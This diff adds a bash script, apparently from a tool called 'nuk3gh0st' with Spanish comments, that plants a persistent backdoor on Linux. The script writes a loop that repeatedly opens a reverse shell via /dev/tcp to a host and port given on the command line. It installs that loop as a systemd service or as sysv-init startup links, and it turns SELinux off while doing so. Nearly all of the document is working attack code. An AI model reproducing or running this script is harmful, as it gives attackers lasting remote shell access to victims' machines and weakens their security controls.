@@ -1,0 +1,213 @@
+#!/bin/bash
+
+green='\e[0;32m'
+red='\e[0;31m'
+purple='\e[0;35m'
+yellow='\e[0;33m'
+cyan='\e[0;36m'
+endColor='\e[0m'
+item=${green}[*]${endColor}
+
+function show_help {
+    echo "Ayuda del programa"
+    exit 0
+}
+
+function generate_backdoor {
+	backdoor_dir='/usr/share/nuk3gh0st/backdoor'
+	echo "#!/bin/bash" > $backdoor_dir
+	echo "" >> $backdoor_dir
+	echo "while true" >> $backdoor_dir
+	echo "do" >> $backdoor_dir
+	echo "	sleep $SLEEP" >> $backdoor_dir
+	echo "	bash -i >& /dev/tcp/$HOST/$PORT 0>&1" >> $backdoor_dir
+	echo "done" >> $backdoor_dir
+	chmod +x $backdoor_dir
+}
+
+function remove_backdoor {
+    echo "Removiendo backdoor"
+    exit 0
+}
+
+function enable_selinux {
+	echo -e "${item} Reenabling SELINUX"
+	echo -e "   ${purple} cmd: setenforce 1${endColor}"
+	setenforce 1
+        echo ""
+}
+
+function disable_selinux {
+	echo -e "${item} Disabling SELINUX temporarily"
+	echo -e "   ${purple} cmd: setenforce 0${endColor}"
+	setenforce 0
+	echo ""
+}
+
+function create_systemd_service {
+	echo -e "${item} Coping nuk3gh0st.service to systemd startup scripts directory"
+	echo -e "   ${purple} cmd: cp /usr/share/nuk3gh0st/nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service${endColor}"
+	cp /usr/share/nuk3gh0st/backdoor.service /lib/systemd/system/backdoor.service
+	echo ""
+}
+
+function enable_systemd_service {
+	echo -e "${item} Enabling nuk3gh0st.service"
+	echo -e "   ${purple} cmd: systemctl enable nuk3gh0st.service${endColor}"
+	echo -n -e "${cyan}"
+	systemctl enable backdoor.service
+	echo -n -e "${endColor}"
+	echo ""
+	
+	#echo -e "${item} Starting nuk3gh0st.service"
+	#echo -e "   ${purple} cmd: service nuk3gh0st start${endColor}"
+	#echo -n -e "${cyan}"
+	#service nuk3gh0st start
+	#echo -n -e "${endColor}"
+	#echo ""
+}
+
+function create_init_service {
+	echo -e "${item} Coping backdoor to /etc/init.d/ (sysv-init startup script directory)"
+	echo -e "   ${purple} cmd: cp /usr/share/nuk3gh0st/backdoor /etc/init.d/backdoor${endColor}"
+	cp /usr/share/nuk3gh0st/backdoor /etc/init.d/backdoor
+	echo ""
+}
+
+function create_rc_symlinks {
+	echo -e "${item} Create symbolic links of backdoor for run levels from 1 to 5"
+	echo -e "   ${purple} cmd: ln -s /etc/init.d/backdoor /etc/rc1.d/S98backdoor${endColor}"
+	ln -s /etc/init.d/backdoor /etc/rc1.d/S98backdoor
+	echo -e "   ${purple} cmd: ln -s /etc/init.d/backdoor /etc/rc2.d/S98backdoor${endColor}"
+	ln -s /etc/init.d/backdoor /etc/rc2.d/S98backdoor
+	echo -e "   ${purple} cmd: ln -s /etc/init.d/backdoor /etc/rc3.d/S98backdoor${endColor}"
+	ln -s /etc/init.d/backdoor /etc/rc3.d/S98backdoor
+	echo -e "   ${purple} cmd: ln -s /etc/init.d/backdoor /etc/rc4.d/S98backdoor${endColor}"
+	ln -s /etc/init.d/backdoor /etc/rc4.d/S98backdoor
+	echo -e "   ${purple} cmd: ln -s /etc/init.d/backdoor /etc/rc5.d/S98backdoor${endColor}"
+	ln -s /etc/init.d/backdoor /etc/rc5.d/S98backdoor
+	echo ""
+}
+
+function enable_startup_service {
+	echo -e "${item} Detecting init system..."
+	echo -n -e "${cyan}"
+	if [[ `/sbin/init --version` =~ upstart ]]; then 
+		echo -n -e "${endColor}"
+		echo -e "${item} Init system is upstart"
+		create_init_service
+		create_rc_symlinks
+	elif [[ `systemctl` =~ -\.mount ]]; then
+		echo -n -e "${endColor}"
+		echo -e "${item} Init system is systemd"
+		create_systemd_service
+		enable_systemd_service
+	elif [[ -f /etc/init.d/cron && ! -h /etc/init.d/cron ]]; then
+		echo -n -e "${endColor}"
+		echo -e "${item} Init system is sysv-init"
+		create_init_service
+		create_rc_symlinks
+	else 
+		echo -n -e "${endColor}"
+		echo -e "${item} Init system is unrecognized. Trying with sysv-init"
+		create_init_service
+		create_rc_symlinks
+	fi
+}
+
+function check_selinux_enable_startup_service {
+	echo -e "${item} Checking if SELINUX is enabled"
+	if [ -f /usr/sbin/semanage ]; then
+		echo -e "${item} SELINUX is enabled"
+		disable_selinux
+		enable_startup_service	
+		enable_selinux
+	else
+		echo -e "${item} SELINUX is disabled"
+		enable_startup_service
+	fi
+}
+
+
+HOST=""
+PORT=""
+SLEEP=""
+
+HOST_ARG=""
+PORT_ARG=""
+SLEEP_ARG=""
+HELP_ARG=""
+REMOVE_ARG=""
+
+# Mientras el número de argumentos NO SEA 0
+while [ $# -ne 0 ]
+do
+    case "$1" in
+    -h|--help)
+		HELP_ARG="OK"
+		shift
+        ;;
+	-h|--host)
+		HOST_ARG="OK"
+		HOST="$2"
+		shift
+        ;;
+	-p|--port)
+		PORT_ARG="OK"
+		PORT="$2"
+		shift
+        ;;
+	-s|--sleep)
+		SLEEP_ARG="OK"
+		SLEEP="$2"
+		shift
+        ;;
+    -r|--remove)
+		REMOVE_ARG="OK"
+		shift
+        ;;
+    *)
+        echo "Argumento no válido"
+        show_help
+        ;;
+    esac
+    shift
+done
+
+
+if [[ $HOST_ARG && $PORT_ARG && $SLEEP_ARG && -z $HELP_ARG && -z $REMOVE_ARG ]]
+then
+	generate_backdoor
+	check_selinux_enable_startup_service
+elif [[ -z $HOST_ARG && -z $PORT_ARG && -z $SLEEP_ARG && -z $HELP_ARG && $REMOVE_ARG ]]
+then
+	remove_backdoor
+elif [[ -z $HOST_ARG && -z $PORT_ARG && -z $SLEEP_ARG && $HELP_ARG && -z $REMOVE_ARG ]]
+then
+	show_help
+else
+	echo "Está ingresando los parametros malmente"
+fi
+
+
+
+
+
+#if [ -z "$USERNAME" ]
+#then
+#    echo "El nombre de usuario es OBLIGATORIO"
+#fi
+
+#if [ -z "$SERVER" ]
+#then
+#    SERVER="servidor.por.defecto.com"
+#fi
+
+#echo "Nombre de usuario: $USERNAME"
+#echo "Servidor: $SERVER"
+#if [ -n "$VERBOSE" ]
+#then
+#    echo "El modo VERBOSE está ACTIVADO"
+#else
+#    echo "El modo VERBOSE está DESACTIVADO"
+#fi
